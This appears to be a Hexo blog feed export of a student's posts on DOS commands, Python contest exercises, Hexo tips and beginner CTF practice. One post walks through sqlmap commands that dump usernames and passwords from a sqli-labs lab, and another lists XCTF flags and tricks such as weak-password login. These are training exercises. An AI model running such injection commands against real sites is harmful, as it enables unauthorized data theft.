最后保存再选择，相当于直接另存为了吧。</span><br></pre></td></tr></table></figure><p>9.md:在当前路径下新建一个文件夹 语法格式为：<code>md d:\123</code> 就是在d盘里边建了一个名为123的文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.Tab键：可用于补全未输入完整的语句，猜测性的，输的越多，猜测的效果越好。</span><br><span class="line">          实际上对名字比较长的 文件名 或者 文件夹名 比较好用吧。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">11.ping:不知道怎么解释，发送数据包的命令吧，</span><br><span class="line">        ping + 指定的ip或者域名就可以发送数据包啦。</span><br><span class="line">12.del:del + 文件名表示删除本目录下的一个文件，</span><br></pre></td></tr></table></figure><p>13.rd:与md相对，表示删除文件夹。语法格式为：<code>md d:\123</code> 就是在d盘里边建了一个名为123de文件夹</p><p>14.ren:重命名，语法格式：<code>ren a.txt b.txt</code> 此时<code>a.txt</code>的文件名就被改为了<code>b.txt</code><br>15.exit:退出dos命令行模式，但是如果是在ftp模式下，需要先bye或者quit再然后才能使用exit命令退出命令行模式。<br>16.tracert：语法格式为<code>tracert [ip名或者域名]</code> 例如 <code>tracert www.baidu.com</code>就可以列出从本地到百度之间的跃点ip<br>17.title 标题名字 更改CMD窗口标题[即窗口最上方的标题]名字，感觉很秀(其实也就那样)<br>18.route print 显示出IP路由，将主要显示网络地址(Network addres)，子网掩码(Netmask)，网关地址(Gateway addres)，接口地址(Interface)<br>19.date:显示当前时间，不错，这就是传说中的超级鸡肋的功能。<br>20.cmd:再开启一个cmd的控制台，没错，这个也很鸡肋。</p>]]></content>
      
      
      
        <tags>
            
            <tag> dos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python练习</title>
      <link href="/2020/01/19/python%E7%BB%83%E4%B9%A0/"/>
      <url>/2020/01/19/python%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="蓝桥杯-最简单的交换-python"><a href="#蓝桥杯-最简单的交换-python" class="headerlink" title="蓝桥杯-最简单的交换-python"></a>蓝桥杯-最简单的交换-python</h3><p>下面是给定N个整数组成的序列，每次交换当前第x个与第y个整数，要求输出最终的序列。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x,y=map(int,input().split())</span><br><span class="line">data=list(map(int,input().split()))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">    i,j=map(int,input().split())</span><br><span class="line">    i=i<span class="number">-1</span></span><br><span class="line">    j=j<span class="number">-1</span></span><br><span class="line">    data[i],data[j]=data[j],data[i]</span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    print(data[temp])</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="蓝桥杯-算法提高-复数求和-python"><a href="#蓝桥杯-算法提高-复数求和-python" class="headerlink" title="蓝桥杯-算法提高-复数求和-python"></a>蓝桥杯-算法提高-复数求和-python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sum1=sum2=<span class="number">0</span></span><br><span class="line">n=int(input())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,n):</span><br><span class="line">    x,y=map(int,input().split())</span><br><span class="line">    sum1=sum1+x</span><br><span class="line">    sum2=sum2+y</span><br><span class="line">print(sum1,end=<span class="string">''</span>)</span><br><span class="line">print(<span class="string">"+"</span>,end=<span class="string">''</span>)</span><br><span class="line">print(sum2,end=<span class="string">''</span>)</span><br><span class="line">print(<span class="string">'i'</span>,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h3 id="蓝桥杯-算法提高-单词个数统计-python"><a href="#蓝桥杯-算法提高-单词个数统计-python" class="headerlink" title="蓝桥杯-算法提高-单词个数统计-python"></a>蓝桥杯-算法提高-单词个数统计-python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">juzi=list(map(str,input().split()))<span class="comment">#字符串转换为列表形式    </span></span><br><span class="line">n=<span class="number">0</span>      <span class="comment">#初始化标记值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> juzi:                    </span><br><span class="line">    n=n+<span class="number">1</span>  <span class="comment">#标记值在此标记    </span></span><br><span class="line">print(n)<span class="comment">#打印出单词个数</span></span><br></pre></td></tr></table></figure><h3 id="蓝桥杯–old-1251–前十名-python"><a href="#蓝桥杯–old-1251–前十名-python" class="headerlink" title="蓝桥杯–old 1251–前十名-python"></a>蓝桥杯–old 1251–前十名-python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">list1=[]</span><br><span class="line">n=int(input())</span><br><span class="line">list1=list(map(int,input().split()))</span><br><span class="line">list1.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    print(<span class="string">"&#123;&#125;"</span>.format(list1[j]),end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> j != <span class="number">9</span>:</span><br><span class="line">        print(<span class="string">""</span>,end=<span class="string">' '</span>)</span><br></pre></td></tr></table></figure><p>介绍一下今天的这个例子中关于数组的用法<br>./</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list.sort(key=<span class="literal">None</span>,reverse=<span class="literal">False</span> <span class="keyword">or</span> reverse=<span class="literal">True</span>) <span class="comment">#False = 升序，True = 降序。</span></span><br><span class="line">key : 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</span><br><span class="line">如: key = str 就是对str元素进行排列./</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小数点后保留两位小数</span><br><span class="line">print(round(object,<span class="number">2</span>)) <span class="comment"># 2为保留的小数位数是两位</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于hexo博客</title>
      <link href="/2020/01/19/%E5%85%B3%E4%BA%8Ehexo%E5%8D%9A%E5%AE%A2/"/>
      <url>/2020/01/19/%E5%85%B3%E4%BA%8Ehexo%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>今天在使用markdown语法创建表格的时候遇到了一些问题，为了防止遗忘和方便查找，现在把它记录下来：<br>markdown创建表格的时候，一定要记得在<code>表格的第一行的前面与上文之间空一行</code>，切记</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| 1 | 2 |</span><br><span class="line">|---|---|</span><br><span class="line">|张三|李四|</span><br></pre></td></tr></table></figure><p>效果呢，就是这样</p><a id="more"></a><table><thead><tr><th>1</th><th>2</th></tr></thead><tbody><tr><td>张三</td><td>李四</td></tr></tbody></table><p>很简单的问题，我却卡在这里卡了好久，原因就是网上关于表格的制作描述的不是很详细，最后才在某个大佬的博客里找到了解决的办法。<br>另外，记录一下上传博客的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean:好像不是必须的</span><br><span class="line">hexo g -d:更新并上传也可以拆开写，就像这样：</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>生成新的博客的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new post [文章名] 或者 </span><br><span class="line">hexo new title [文章名]</span><br><span class="line">二者都可以实现生成博客的目的</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2020/01/18/%E5%88%9D%E5%AD%A6sqlmap/"/>
      <url>/2020/01/18/%E5%88%9D%E5%AD%A6sqlmap/</url>
      
        <content type="html"><![CDATA[<p><code>2020-1-18</code><br>&emsp;&emsp;今天练习了在Windows上使用sqlmap进行sqli-labs的less-1注入，获得了用户名和密码，还是很开心并且很有成就感的，下面说一下我的步骤吧。</p><p>&emsp;&emsp;首先，我在我的vm的win10的虚拟机上装上了python1.7的环境，下载了py版的sqlmap且学会了如何在cmd下使用sqlmap.py文件进行注入，就是一路cd到那个文件夹，然后再<code>python sqlmap.py</code>，就可以啦，然后我也不清楚怎么用这个sqlmap就行了，反正遇到问题的时候再解决问题也一样，说一下步骤吧。</p><a id="more"></a><p>&emsp;1.首先这样:<br>&emsp;&emsp;<code>sqlmap -u &quot;http://web-labs.rinue.top/sqli-labs/Less-1/?id=1&quot; --level=3</code><br>&emsp;2.然后这样:<br>&emsp;&emsp;<code>sqlmap -u &quot;http://web-labs.rinue.top/sqli-labs/Less-1/?id=1&quot; --dbs --level=3</code><br>&emsp;3.然后在这样:<br>&emsp;&emsp;<code>sqlmap -u &quot;http://web-labs.rinue.top/sqli-labs/Less-1/?id=1&quot; -D &quot;security&quot; --tables --level=3</code><br>&emsp;4.再然后这样:<br>&emsp;&emsp;<code>sqlmap -u &quot;http://web-labs.rinue.top/sqli-labs/Less-1/?id=1&quot; -D &quot;security&quot; -T &quot;users&quot; --cloumns --level=3</code><br>&emsp;5.最后再这样:<br>&emsp;&emsp;<code>sqlmap -u &quot;http://web-labs.rinue.top/sqli-labs/Less-1/?id=1&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump --level=3</code></p><p>&emsp;&emsp;最后在output文件夹里找到了dump下来的摘要如下(我’格式化’了一下)：</p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>Dumb</td><td>Dumb</td></tr><tr><td>Angelina</td><td>I-kill-you</td></tr><tr><td>Dummy</td><td>p@ssword</td></tr><tr><td>secure</td><td>crappy</td></tr><tr><td>stupid</td><td>stupidity</td></tr><tr><td>superman</td><td>genious</td></tr><tr><td>batman</td><td>mob!le</td></tr><tr><td>admin</td><td>admin</td></tr><tr><td>admin1</td><td>admin1</td></tr><tr><td>admin2</td><td>admin2</td></tr><tr><td>admin3</td><td>admin3</td></tr><tr><td>dhakkan</td><td>dumbo</td></tr><tr><td>admin4</td><td>admin4</td></tr></tbody></table><p>&emsp;&emsp;今天算是还不错吧，dos命令又更新了哈。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 新手 </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假ctf</title>
      <link href="/2020/01/13/%E5%AF%92%E5%81%87ctf/"/>
      <url>/2020/01/13/%E5%AF%92%E5%81%87ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="寒假也不能停止学习啊"><a href="#寒假也不能停止学习啊" class="headerlink" title="寒假也不能停止学习啊"></a>寒假也不能停止学习啊</h2><p>今天参加了实验室的ctf竞赛，首先感谢老学长搞的赞助,其次要喷自己一下，<br>我真的是实验室最菜水平了，哎，不说了。就这样吧，明天再开始做其他平<br>台的题目，趁着假期好好地刷一下题，明天开始，不定期向博客里上传write<br> up，我一定会努力的！加油。</p> <a id="more"></a><p> 前几天做的xctf攻防世界的一些题目，感觉新手区的web很友好，但是高手<br> 区属实有些让人头大//主要还是我太菜了，今天就总结一下。<br> 1.view_source<br> 这一题还不错，可以使用F12大法进入开发者模式，虽然说右键不能正常使<br> 用了，应该是标签中添加了属性禁止。<br> 看了别人写的wp，应该至少有三种办法，第一就是直接F12，第二个就是使<br> 用burp suite进行抓包，第三种应该才是考点。就是使用Firefox上仍在<br> 使用的view souce协议进行查看源码，就是下面这个东西了，感觉很经典：<br> view-source:<a href="http://111.198.29.45:38122/" target="_blank" rel="noopener">http://111.198.29.45:38122/</a><br> 没想到还有这种操作，还是我太菜了啊。</p><p> 2.robots<br> 这个我比较熟悉，因为我做了两次，印象很深刻，robots.txt是防止网站<br> 的某些信息被web crawler （网络爬虫）获取的一些信息，ctf了可能会<br> 隐藏一些关键的线索。<br> 嗯，直接在URL后加一个/robots.txt就可以了，然后提示进入某个php界<br> 面，flag就在那个界面里边，还行，适合我这种小菜鸟。</p><p> 3.backup<br> 开始不知道，看了别人的wp才知道是要在URL的后面加上.bak，听高手们说<br> 备份的文件扩展名一般就是.bak，孤陋寡闻了，害。</p><p>明天做一下那个sqli-labs挣扎一下。<br>4.cookie<br>  cyberpeace{1562461e2725c19d1b435690321d06e2}<br>  在url后面加入/cookie.php会再给一个提示：See the http response<br>  在用火狐浏览器看了一下响应头找到了这个flag。<br>5.disabled_button<br>  cyberpeace{7d0cd3dd6560ecc5117a39b869ffcf50}<br>  第一种方法是将disable=””删除<br>  第二种方法是通过post的方法传入值，auth=flag<br>  最后都可以获得flag，一定要记住！<br>6.weak_auth<br>  cyberpeace{2ea19ccac9079019d3a1ea676f0ee0c1}<br>  是弱口令，然后就是很弱的弱口令。<br>  username：admin<br>  password:123456<br>  是其中的一套方案，回来有空再试一下burpsuite尝试一下。   </p><h2 id="今天使用大白菜PE重装了一下系统"><a href="#今天使用大白菜PE重装了一下系统" class="headerlink" title="今天使用大白菜PE重装了一下系统"></a>今天使用大白菜PE重装了一下系统</h2><p><code>2020年_1月_17号</code><br>额，用的是我姐的电脑，是联想i3的，六年前买的，报废了，我就尝试着重装了一下系统，原来的系统是Windows8的系统，我是首先换成了Windows7的系统，后来又因为win7上的<code>wi-fi</code>我不会连接（企业版的）没深入研究怎么连接，我就换成了win10的系统，同样是企业版的，还很不错（至少会连接WiFi了），还是很有成就感的，又会了一个技能，维持生活又多了一个方式嘿嘿。。。另外，需要重装系统又不会重装的可以联系我，我的qq是<code>**********</code>，嘿嘿。明天再练<code>sqlmap</code>玩，顺便做一道算法题目，dos口令又更新了啊！！！</p><h3 id="在装系统时遇到的困难"><a href="#在装系统时遇到的困难" class="headerlink" title="在装系统时遇到的困难"></a>在装系统时遇到的困难</h3><p>现在呢，装系统都是一键式的傻瓜式的，并没有遇到太多的困难，简要说一下吧！首先呢，安装启动u盘时，因为没有经验，用老毛桃安装启动盘然后不知道怎么用就又卸载了，后来呢，才下载安装了大白菜的PE，发现极其的简洁，其实老毛桃不一定就很差，但是奈何我上没有经验的时候碰上了老毛桃，对于<code>老毛桃</code>女士，我感到非常的抱歉(手工滑稽)。一定要记得把想要安装的系统的iso镜像文件放在u盘里，随取随用，自己的文件也可以放在这个u盘里，但是重要的文件一定要记备份一个u盘，反正现在多买一个u盘也不是很贵的样子。最后呢，在我不懈努力之下，大白菜和我搞定了这个顽强的快要报废的电脑。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具网址集</title>
      <link href="/2020/01/11/%E5%B7%A5%E5%85%B7%E7%BD%91%E5%9D%80%E9%9B%86/"/>
      <url>/2020/01/11/%E5%B7%A5%E5%85%B7%E7%BD%91%E5%9D%80%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h3 id="搜集了部分工具的网址。。。"><a href="#搜集了部分工具的网址。。。" class="headerlink" title="搜集了部分工具的网址。。。"></a>搜集了部分工具的网址。。。</h3><a id="more"></a><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅地址</a><br><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">ctf部分工具集</a><br><a href="https://www.ctfhub.com/#/tools" target="_blank" rel="noopener">ctfhub</a> /<em>这里的工具不少</em>/</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于python的短浅学习-2019年底</title>
      <link href="/2019/12/20/%E5%85%B3%E4%BA%8Epython%E7%9A%84%E7%9F%AD%E6%B5%85%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/12/20/%E5%85%B3%E4%BA%8Epython%E7%9A%84%E7%9F%AD%E6%B5%85%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>  python最具特色的就是使用缩进来表示代码块，不需要使用大括号 {} 。<br>缩进的空格数是可以变化的，但是同一个&lt;&lt;代码块&gt;&gt;的语句必须包含相同的缩进空格数。如果代码块的缩进空格数不相等，运行就会出现错误！<br>–<br>python中，单引号与双引号使用完全相同；转义符也是“\”；使用r可以让“\”不发生转义，如r”this is my learning content \n”,则\n会显示，而并不会换行；”this “”is “”my “”name”会自动转换为”this is my name”;使用<em>会重复字符串…用+可以连接各个字符串；如：print(“this “”is “”my “”name. “</em>3)则会输出this is my name. this is my name. this is my name.;</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">str=<span class="string">'Runoob'</span></span><br><span class="line"></span><br><span class="line">print(str)                 <span class="comment"># 输出字符串</span></span><br><span class="line">print(str[<span class="number">0</span>:<span class="number">-1</span>])           <span class="comment"># 输出第一个到倒数第二个的所有字符</span></span><br><span class="line">print(str[<span class="number">0</span>])              <span class="comment"># 输出字符串第一个字符</span></span><br><span class="line">print(str[<span class="number">2</span>:<span class="number">5</span>])            <span class="comment"># 输出从第三个开始到第五个的字符</span></span><br><span class="line">print(str[<span class="number">2</span>:])             <span class="comment"># 输出从第三个开始后的所有字符</span></span><br><span class="line">print(str * <span class="number">2</span>)             <span class="comment"># 输出字符串两次</span></span><br><span class="line">print(str + <span class="string">'你好'</span>)        <span class="comment"># 连接字符串</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;print(<span class="string">'------------------------------'</span>)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;print(<span class="string">'hello\nrunoob'</span>)      <span class="comment"># 使用反斜杠(\)+n转义特殊字符</span></span><br><span class="line">&gt;&gt;&gt;print(<span class="string">r'hello\nrunoob'</span>)     <span class="comment"># 在字符串前面添加一个 r，表示原始字符串，不会发生转义</span></span><br></pre></td></tr></table></figure><p>字符串引用时一定要加上<code>&quot;&quot;</code>;print时输出的如果是变量的值的话，则不能带上<code>&quot;&quot;</code>;如果是字符串的话，则必须带上<code>&quot;&quot;</code>.如print(“myname”)#输出的是 <code>myname</code> ;<br>若先令<code>myname=李华</code>，则输出的是<code>李华</code> 。python允许同时为多个变量赋值，如<code>a=b=c=12</code>.则<code>a=12,b=12,c=12</code>.也可以这样：a,b,c=1,2,3输出的是a=1,b=2,c=3.</p><hr><h3 id="关于format的用法。。。"><a href="#关于format的用法。。。" class="headerlink" title="关于format的用法。。。"></a>关于format的用法。。。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;0:b&#125;'</span>.format(<span class="number">3</span>))</span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;:c&#125;'</span>.format(<span class="number">20</span>))</span><br><span class="line">       <span class="comment">#已经转换成了特殊字符。。。即Unicode编码的字符</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;:d&#125;'</span>.format(<span class="number">20</span>))</span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;:o&#125;'</span>.format(<span class="number">20</span>))</span><br><span class="line"><span class="number">24</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;:x&#125;'</span>.format(<span class="number">20</span>))</span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;:e&#125;'</span>.format(<span class="number">20</span>))</span><br><span class="line"><span class="number">2.000000e+01</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;:g&#125;'</span>.format(<span class="number">20.1</span>))</span><br><span class="line"><span class="number">20.1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;:f&#125;'</span>.format(<span class="number">20</span>))</span><br><span class="line"><span class="number">20.000000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;:n&#125;'</span>.format(<span class="number">20</span>))</span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'&#123;:%&#125;'</span>.format(<span class="number">20</span>))</span><br><span class="line"><span class="number">2000.000000</span>%</span><br><span class="line">&gt;&gt;&gt;print(<span class="string">'&#123;&#125;'</span>.format(要拼接的元素【中间用，隔开】))</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">"  。。 &#123;&#125;"</span>.format(i),end=<span class="string">''</span>)      <span class="comment">#用来拼接字符串。注意句号嘿嘿。。。i在花括号里输出。</span></span><br><span class="line">                                             <span class="comment">#花括号本身不输出。</span></span><br></pre></td></tr></table></figure><h3 id="蓝桥杯-python-九九乘法表-python表达"><a href="#蓝桥杯-python-九九乘法表-python表达" class="headerlink" title="蓝桥杯-python 九九乘法表 python表达"></a>蓝桥杯-python 九九乘法表 python表达</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;print(<span class="string">"Nine-by-nine Multiplication Table"</span>)</span><br><span class="line">&gt;&gt;&gt;print(<span class="string">"--------------------------------------"</span>)</span><br><span class="line">&gt;&gt;&gt;print(<span class="string">"     1   2   3   4   5   6   7   8   9"</span>)      <span class="comment">#true---粘贴复制</span></span><br><span class="line">&gt;&gt;&gt;print(<span class="string">"--------------------------------------"</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):                                <span class="comment">#use i take place hang;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>   print(<span class="string">"  。。 &#123;&#125;"</span>.format(i),end=<span class="string">''</span>)              <span class="comment">#用来拼接字符串。注意句号嘿嘿。。。i在花括号里输出，花括号本身不输出</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>):                           <span class="comment">#use j take place lie;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>      print(<span class="string">"&#123;:4d&#125;"</span>.format(i*j),end=<span class="string">''</span>)             <span class="comment">#格式化输出 右对齐占4位</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>   <span class="keyword">print</span> ()</span><br><span class="line">&gt;&gt;&gt;print(<span class="string">"--------------------------------------"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;a,b=map(int,input().split())                         <span class="comment">#实现一行输入多值，中间使用空格隔开</span></span><br><span class="line">其中 int 为所要输入的变量类型，input()表示输入操作，。split()为固定的格式。</span><br></pre></td></tr></table></figure><h3 id="python3-求一个区间内有多少素数的实现-python"><a href="#python3-求一个区间内有多少素数的实现-python" class="headerlink" title="python3 求一个区间内有多少素数的实现 python"></a>python3 求一个区间内有多少素数的实现 python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;x,y=map(int,input().split())                         <span class="comment">#实现一行输入多值，中间使用空格隔开    </span></span><br><span class="line">&gt;&gt;&gt;count=<span class="number">0</span>                                              <span class="comment">#定义一个求个数的整型值</span></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> i <span class="keyword">in</span> range(x,y+<span class="number">1</span>):                               <span class="comment">#两个循环实现素数判定</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>,y+<span class="number">1</span>):</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>       <span class="keyword">if</span> i%j==<span class="number">0</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>           <span class="keyword">break</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>   <span class="keyword">if</span> j&gt;=i:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>       count=count+<span class="number">1</span>                                <span class="comment">#每出现一个素数 ，count +1</span></span><br><span class="line">&gt;&gt;&gt;print(count)                                         <span class="comment">#最后输出count</span></span><br></pre></td></tr></table></figure><h3 id="python3-整数的查询-不是很完善-python"><a href="#python3-整数的查询-不是很完善-python" class="headerlink" title="python3 整数的查询-不是很完善-python"></a>python3 整数的查询-不是很完善-python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;n=int(input())</span><br><span class="line">&gt;&gt;&gt;data=list(map(int,input().split()))                  <span class="comment">#加一个list就成了一个列表了。map的用处同上。</span></span><br><span class="line">&gt;&gt;&gt;data2=int(input())</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,n):</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>   <span class="keyword">if</span> data2 ==data[j]:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>       print(j+<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>       <span class="keyword">break</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>   <span class="keyword">if</span> j==n<span class="number">-1</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>       print(<span class="string">'-1'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;str.zfill(width)</span><br><span class="line">&gt;&gt;&gt;input: <span class="string">'123'</span>.zfill(<span class="number">32</span>)</span><br><span class="line">&gt;&gt;&gt;output:<span class="string">'00000000000000000000000000000123'</span></span><br><span class="line">&gt;&gt;&gt;这是一个关于字符串填充的办法。width为所要的总长度</span><br><span class="line">&gt;&gt;&gt;不改变数的值的填充。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = n.zfill(<span class="number">5</span>)       <span class="comment">#在字符串n的前面使用0补足五位成为s</span></span><br></pre></td></tr></table></figure><h3 id="多个时间的同时转换-python"><a href="#多个时间的同时转换-python" class="headerlink" title="多个时间的同时转换-python"></a>多个时间的同时转换-python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 